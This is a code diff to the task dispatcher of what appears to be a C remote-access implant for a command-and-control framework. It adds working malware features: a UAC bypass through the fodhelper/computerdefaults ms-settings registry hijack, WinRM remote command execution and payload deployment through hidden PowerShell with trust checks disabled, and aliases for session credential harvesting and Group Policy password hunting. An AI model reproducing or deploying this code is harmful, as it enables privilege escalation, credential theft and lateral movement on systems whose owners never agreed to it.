@@ -1260,7 +1260,7 @@ void dispatch_task(AgentTask *task) {
         char *out = token_make(user, domain, pass);
         agent_send_result(task->id, out, ""); free(out);
     }
-    else if (strcmp(type_upper, "TOKEN_DROP") == 0) {
+    else if (strcmp(type_upper, "TOKEN_DROP") == 0 || strcmp(type_upper, "REV2SELF") == 0) {
         RevertToSelf();
         agent_send_result(task->id, "[+] reverted to original token", "");
     }
@@ -2015,7 +2015,7 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id,"[+] SOCKS5 stopped","");
     }
     // ── FEATURE 8: SESSION_GOPHER ─────────────────────────────────────────────
-    else if (strcmp(type_upper, "SESSION_GOPHER") == 0) {
+    else if (strcmp(type_upper, "SESSION_GOPHER") == 0 || strcmp(type_upper, "SESSION_CREDS") == 0) {
         size_t sg_cap=65536, sg_len=0;
         char *sg_out = (char*)malloc(sg_cap);
         if (!sg_out) { agent_send_result(task->id,"","oom"); return; }
@@ -2094,7 +2094,7 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id,sg_out,""); free(sg_out);
     }
     // ── FEATURE 9: GPP_HUNT ──────────────────────────────────────────────────
-    else if (strcmp(type_upper, "GPP_HUNT") == 0) {
+    else if (strcmp(type_upper, "GPP_HUNT") == 0 || strcmp(type_upper, "GPP_PASSWORDS") == 0) {
         char *xml_list = run_shell("dir /s /b \\\\%LOGONSERVER%\\SYSVOL\\*.xml 2>nul");
         if (!xml_list) { agent_send_result(task->id,"","dir failed"); return; }
         size_t gpp_cap=65536, gpp_len=0;
@@ -2925,6 +2925,90 @@ void dispatch_task(AgentTask *task) {
         } else {
             agent_send_result(task->id, "", "BOF: execution failed");
         }
+    }
+#endif /* _WIN32 */
+#ifdef _WIN32
+    else if (strcmp(type_upper, "ELEVATE") == 0) {
+        /* UAC bypass via fodhelper/computerdefaults registry hijack */
+        /* Args: "fodhelper <cmd>" | "computerdefaults <cmd>" — default: fodhelper + self */
+        char elv_meth[32] = "fodhelper";
+        char elv_cmd[1024] = "";
+        const char *sp = strchr(args, ' ');
+        if (sp) {
+            size_t ml = (size_t)(sp - args);
+            if (ml < sizeof(elv_meth)) { memcpy(elv_meth, args, ml); elv_meth[ml] = '\0'; }
+            strncpy(elv_cmd, sp + 1, sizeof(elv_cmd) - 1);
+        } else if (args && args[0]) {
+            strncpy(elv_meth, args, sizeof(elv_meth) - 1);
+        }
+        if (!elv_cmd[0]) GetModuleFileNameA(NULL, elv_cmd, (DWORD)sizeof(elv_cmd));
+        const char *regPath = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command";
+        char reg1[2048], reg2[1024];
+        snprintf(reg1, sizeof(reg1), "reg add \"%s\" /ve /t REG_SZ /d \"%s\" /f", regPath, elv_cmd);
+        snprintf(reg2, sizeof(reg2), "reg add \"%s\" /v \"DelegateExecute\" /t REG_SZ /d \"\" /f", regPath);
+        char *r1 = run_shell(reg1); free(r1);
+        char *r2 = run_shell(reg2); free(r2);
+        const char *exe3 = (_stricmp(elv_meth, "computerdefaults") == 0)
+            ? "C:\\Windows\\System32\\ComputerDefaults.exe"
+            : "fodhelper.exe";
+        char run_cmd[256];
+        snprintf(run_cmd, sizeof(run_cmd), "start %s", exe3);
+        char *r3 = run_shell(run_cmd); free(r3);
+        Sleep(2000);
+        char *r4 = run_shell("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f"); free(r4);
+        char out_msg[512];
+        snprintf(out_msg, sizeof(out_msg), "[+] UAC bypass (%s) triggered: %s", elv_meth, elv_cmd);
+        agent_send_result(task->id, out_msg, "");
+    }
+    else if (strcmp(type_upper, "WINRM_EXEC") == 0) {
+        char wr_target[256]="", wr_user[256]="", wr_pass[256]="", wr_cmd[1024]="";
+        json_get_str(args,"target",wr_target,sizeof(wr_target),"");
+        json_get_str(args,"user",wr_user,sizeof(wr_user),"");
+        json_get_str(args,"pass",wr_pass,sizeof(wr_pass),"");
+        json_get_str(args,"cmd",wr_cmd,sizeof(wr_cmd),"");
+        if (!wr_target[0]||!wr_cmd[0]) {
+            agent_send_result(task->id,"","WINRM_EXEC: {target,user,pass,cmd} required"); return;
+        }
+        char ps_buf[4096];
+        snprintf(ps_buf, sizeof(ps_buf),
+            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
+            "try{$ip=([System.Net.Dns]::GetHostAddresses('%s')|"
+            "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
+            "catch{$ip='%s'};"
+            "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
+            "Invoke-Command -ComputerName $ip -Authentication NTLM -Credential $c -ScriptBlock {%s}",
+            wr_target, wr_target, wr_user, wr_pass, wr_cmd);
+        char sh_cmd[5120];
+        snprintf(sh_cmd, sizeof(sh_cmd), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
+        char *out3 = run_shell(sh_cmd);
+        agent_send_result(task->id, out3?out3:"", ""); free(out3);
+    }
+    else if (strcmp(type_upper, "WINRM_DEPLOY") == 0) {
+        char wd_target[256]="", wd_user[256]="", wd_pass[256]="", wd_payload[2048]="";
+        json_get_str(args,"target",wd_target,sizeof(wd_target),"");
+        json_get_str(args,"user",wd_user,sizeof(wd_user),"");
+        json_get_str(args,"pass",wd_pass,sizeof(wd_pass),"");
+        json_get_str(args,"payload",wd_payload,sizeof(wd_payload),"");
+        if (!wd_target[0]||!wd_payload[0]) {
+            agent_send_result(task->id,"","WINRM_DEPLOY: {target,user,pass,payload} required"); return;
+        }
+        char ps_buf2[4096];
+        snprintf(ps_buf2, sizeof(ps_buf2),
+            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
+            "try{$ip=([System.Net.Dns]::GetHostAddresses('%s')|"
+            "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
+            "catch{$ip='%s'};"
+            "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
+            "Invoke-Command -ComputerName $ip -Authentication NTLM -Credential $c -AsJob "
+            "-ScriptBlock {%s} | Out-Null",
+            wd_target, wd_target, wd_user, wd_pass, wd_payload);
+        char sh_cmd2[5120];
+        snprintf(sh_cmd2, sizeof(sh_cmd2), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf2);
+        char *out4 = run_shell(sh_cmd2);
+        agent_send_result(task->id, out4?out4:"", ""); free(out4);
+    }
+    else if (strcmp(type_upper, "PIPE_START") == 0 || strcmp(type_upper, "PIPE_STOP") == 0) {
+        agent_send_result(task->id, "", "PIPE_START/STOP: not yet implemented in C agent");
     }
 #endif /* _WIN32 */
     else {
